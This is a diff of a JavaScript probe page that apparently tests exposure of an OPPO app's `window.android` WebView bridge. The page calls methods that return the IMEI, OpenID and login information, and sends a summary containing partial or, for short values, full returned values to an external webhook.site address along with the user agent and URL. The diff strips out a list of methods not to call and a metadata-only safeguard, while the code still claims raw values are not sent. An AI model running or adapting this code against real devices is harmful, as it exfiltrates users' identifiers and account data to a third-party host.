@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>OPPO WebBridge Full Local Sensitive Probe</title>
+  <title>OPPO WebBridge Sensitive Minimal Probe</title>
   <style>
     body { font-family: sans-serif; padding: 24px; }
     pre { background: #f3f3f3; padding: 16px; white-space: pre-wrap; word-break: break-word; }
@@ -11,45 +11,25 @@
   </style>
 </head>
 <body>
-<h1>OPPO WebBridge Full Local Sensitive Probe</h1>
-<p class="warn">
-  Full sensitive values are displayed locally on this device only.
-  Webhook receives only metadata, not raw IMEI/OpenID/LoginInfo.
-</p>
+<h1>OPPO WebBridge Sensitive Minimal Probe</h1>
+<p class="warn">Full sensitive values are displayed locally only. Webhook receives short metadata only.</p>
 <p id="status">WAITING</p>
-<button onclick="runProbe('manual_button')">Run full local sensitive probe again</button>
+<button onclick="runProbe('manual_button')">Run minimal sensitive probe again</button>
 <pre id="out"></pre>
 
 <script>
 (function () {
   const WEBHOOK = "https://webhook.site/0d6bb58d-a021-4aa2-b4d6-2d2ebb72fcdd";
 
-  const READONLY_SENSITIVE_METHODS = [
+  const METHODS = [
     "getImei",
     "getOpenId",
     "getLoginInfo",
     "isLogin",
-    "getChannelId"
-  ];
-
-  const DO_NOT_CALL = [
-    "startPay",
-    "downloadGameByPackageName",
-    "clipboardText",
-    "openActivity",
-    "openGame",
-    "openGameDetailActivity",
-    "openGameWithId",
-    "openVideoPlayer",
-    "openWebView",
-    "callNativeApi",
-    "callAsyncNativeApi",
-    "doStartLogin",
-    "cancelDownload",
-    "pauseDownload",
-    "startDuiBa",
-    "statAction",
-    "showScreenshotView"
+    "getChannelId",
+    "getPackageName",
+    "getDeviceModel",
+    "getNetworkType"
   ];
 
   function safeString(x) {
@@ -64,154 +44,99 @@
     }
   }
 
-  function metadataOnly(v) {
-    const s = safeString(v);
-    return {
-      empty: s.length === 0 || s === "undefined" || s === "null",
-      length: s.length,
-      typePreview: s === "undefined" || s === "null" ? s : "non-empty-value-not-sent-to-webhook"
-    };
+  function maskLocalPreview(s) {
+    if (!s || s === "undefined" || s === "null") return s;
+    if (s.length <= 8) return s;
+    return s.slice(0, 4) + "***" + s.slice(-4);
   }
 
-  function callReadonlySensitiveMethods() {
-    const localResults = [];
-    const webhookResults = [];
-    const a = window.android;
+  function callMethod(name) {
+    const item = {
+      method: name,
+      exists: false,
+      ok: false,
+      returnType: null,
+      rawReturnValue_LOCAL_ONLY: null,
+      error: null
+    };
 
-    if (!a || typeof a !== "object") {
-      return {
-        localResults: [{ method: "__android_missing__", ok: false, error: "window.android is not object" }],
-        webhookResults: [{ method: "__android_missing__", ok: false, error: "window.android is not object" }]
-      };
-    }
-
-    for (const m of READONLY_SENSITIVE_METHODS) {
-      const localItem = {
-        method: m,
-        exists: false,
-        ok: false,
-        returnType: null,
-        rawReturnValue_LOCAL_ONLY: null,
-        error: null
-      };
-
-      const webhookItem = {
-        method: m,
-        exists: false,
-        ok: false,
-        returnType: null,
-        metadataOnly: null,
-        rawValueSentToWebhook: false,
-        error: null
-      };
-
-      try {
-        const exists = typeof a[m] === "function";
-        localItem.exists = exists;
-        webhookItem.exists = exists;
-
-        if (!exists) {
-          localItem.error = "missing_or_not_function";
-          webhookItem.error = "missing_or_not_function";
-        } else {
-          const ret = a[m]();
-
-          localItem.ok = true;
-          localItem.returnType = typeof ret;
-          localItem.rawReturnValue_LOCAL_ONLY = safeString(ret);
-
-          webhookItem.ok = true;
-          webhookItem.returnType = typeof ret;
-          webhookItem.metadataOnly = metadataOnly(ret);
-        }
-      } catch (e) {
-        const err = String(e && (e.stack || e.message || e));
-        localItem.error = err;
-        webhookItem.error = err;
+    try {
+      const a = window.android;
+      if (!a || typeof a !== "object") {
+        item.error = "window.android missing";
+        return item;
       }
 
-      localResults.push(localItem);
-      webhookResults.push(webhookItem);
-    }
+      item.exists = typeof a[name] === "function";
+      if (!item.exists) {
+        item.error = "missing_or_not_function";
+        return item;
+      }
 
-    for (const m of DO_NOT_CALL) {
-      const skipped = {
-        method: m,
-        skipped: true,
-        reason: "state_changing_or_high_risk_method_not_called"
-      };
-      localResults.push(skipped);
-      webhookResults.push(skipped);
+      const ret = a[name]();
+      item.ok = true;
+      item.returnType = typeof ret;
+      item.rawReturnValue_LOCAL_ONLY = safeString(ret);
+      return item;
+    } catch (e) {
+      item.error = String(e && (e.stack || e.message || e));
+      return item;
     }
-
-    return { localResults, webhookResults };
   }
 
-  function describeAndroidObject() {
-    const a = window.android;
-    if (!a || typeof a !== "object") {
-      return { exists: false, type: typeof a };
-    }
+  function sendShortGet(result) {
+    const summary = result.results.map(function (r) {
+      const raw = safeString(r.rawReturnValue_LOCAL_ONLY);
+      return [
+        r.method,
+        r.exists ? "exists" : "missing",
+        r.ok ? "ok" : "fail",
+        r.returnType || "none",
+        raw.length,
+        raw && raw !== "undefined" && raw !== "null" ? "nonempty" : "empty",
+        maskLocalPreview(raw)
+      ].join(":");
+    }).join("|");
 
-    let ownKeys = [];
-    let functionKeys = [];
+    const url =
+      WEBHOOK +
+      "/oppo-sensitive-minimal-get" +
+      "?event=OPPO_SENSITIVE_MINIMAL_RESULT" +
+      "&t=" + encodeURIComponent(Date.now()) +
+      "&ua=" + encodeURIComponent(navigator.userAgent.slice(0, 180)) +
+      "&href=" + encodeURIComponent(location.href.slice(0, 240)) +
+      "&summary=" + encodeURIComponent(summary.slice(0, 3000));
+
     try {
-      ownKeys = Object.getOwnPropertyNames(a).slice(0, 120);
-      functionKeys = ownKeys.filter(k => {
-        try { return typeof a[k] === "function"; } catch (e) { return false; }
-      });
+      const img = new Image();
+      img.src = url;
     } catch (e) {}
 
-    return {
-      exists: true,
-      type: typeof a,
-      tag: Object.prototype.toString.call(a),
-      ownKeys,
-      functionKeys
-    };
-  }
-
-  function sendWebhookMetadata(payload) {
-    const json = JSON.stringify(payload);
-    const encoded = encodeURIComponent(json);
-
+    // 第二发极短心跳，防止 summary 仍然过长
     try {
-      navigator.sendBeacon(
-        WEBHOOK + "/sensitive-localonly-metadata-beacon",
-        new Blob([json], { type: "application/json" })
-      );
-    } catch (e) {}
-
-    try {
-      fetch(WEBHOOK + "/sensitive-localonly-metadata-post", {
-        method: "POST",
-        mode: "no-cors",
-        headers: { "content-type": "application/json" },
-        body: json
-      }).catch(function(){});
-    } catch (e) {}
-
-    try {
-      new Image().src =
+      const img2 = new Image();
+      img2.src =
         WEBHOOK +
-        "/sensitive-localonly-metadata-get?event=SENSITIVE_LOCALONLY_METADATA_RESULT&t=" +
-        Date.now() +
-        "&d=" +
-        encoded.slice(0, 7000);
+        "/oppo-sensitive-heartbeat" +
+        "?event=OPPO_SENSITIVE_HEARTBEAT" +
+        "&t=" + encodeURIComponent(Date.now()) +
+        "&bridge=" + encodeURIComponent(!!window.android) +
+        "&ua=" + encodeURIComponent(navigator.userAgent.slice(0, 120));
     } catch (e) {}
   }
 
   window.runProbe = function(reason) {
-    const called = callReadonlySensitiveMethods();
+    const results = METHODS.map(callMethod);
 
-    const localDisplayResult = {
-      eventType: "SENSITIVE_FULL_LOCAL_DISPLAY_RESULT",
-      version: "full_local_display_v1_no_raw_webhook",
+    const result = {
+      eventType: "OPPO_SENSITIVE_MINIMAL_LOCAL_RESULT",
+      version: "minimal_get_only_v1",
       ts: new Date().toISOString(),
       reason,
       safetyBoundary: {
         rawSensitiveValuesDisplayedOnDevice: true,
         rawSensitiveValuesSentToWebhook: false,
+        webhookTransport: "Image GET only; short metadata summary only",
         stateChangingMethodsCalled: false
       },
       location: {
@@ -224,36 +149,23 @@
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
-        cookieEnabled: navigator.cookieEnabled,
         webdriver: navigator.webdriver
       },
-      androidBridge: describeAndroidObject(),
-      readonlySensitiveMethodResults_LOCAL_SCREEN_ONLY: called.localResults
-    };
-
-    const webhookMetadataResult = {
-      eventType: "SENSITIVE_LOCALONLY_METADATA_RESULT",
-      version: "full_local_display_v1_no_raw_webhook",
-      ts: localDisplayResult.ts,
-      reason,
-      safetyBoundary: {
-        rawSensitiveValuesDisplayedOnDevice: true,
-        rawSensitiveValuesSentToWebhook: false,
-        stateChangingMethodsCalled: false
+      androidBridge: {
+        exists: !!window.android,
+        type: typeof window.android,
+        tag: window.android ? Object.prototype.toString.call(window.android) : null
       },
-      location: localDisplayResult.location,
-      environment: localDisplayResult.environment,
-      androidBridge: localDisplayResult.androidBridge,
-      readonlySensitiveMethodResults_METADATA_ONLY: called.webhookResults
+      results: results
     };
 
     document.getElementById("status").textContent =
-      "SENSITIVE_FULL_LOCAL_DISPLAY_DONE: " + localDisplayResult.ts;
+      "OPPO_SENSITIVE_MINIMAL_DONE: " + result.ts;
 
     document.getElementById("out").textContent =
-      JSON.stringify(localDisplayResult, null, 2);
+      JSON.stringify(result, null, 2);
 
-    sendWebhookMetadata(webhookMetadataResult);
+    sendShortGet(result);
   };
 
   setTimeout(function () {
